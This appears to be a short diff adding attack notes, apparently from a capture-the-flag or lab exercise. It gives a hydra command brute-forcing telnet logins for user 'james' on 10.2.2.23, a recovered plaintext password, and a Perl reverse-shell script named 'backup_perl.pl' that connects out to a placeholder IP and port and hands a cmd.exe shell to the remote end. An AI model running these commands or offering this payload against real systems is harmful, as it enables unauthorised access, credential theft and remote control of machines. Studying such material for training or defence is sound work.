@@ -1,0 +1,19 @@
+hydra -l james -P passwords.txt 10.2.2.23 telnet
+
+user: james
+password: FmyN3rZ37LNss2X
+
+telnet 10.2.2.23
+
+backup_perl.pl :
+
+#!/usr/bin/perl -w
+use Socket;
+$i="IP";
+$p=PORT;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");
+open(STDOUT,">&S");
+open(STDERR,">&S");
+exec("cmd.exe");
+};
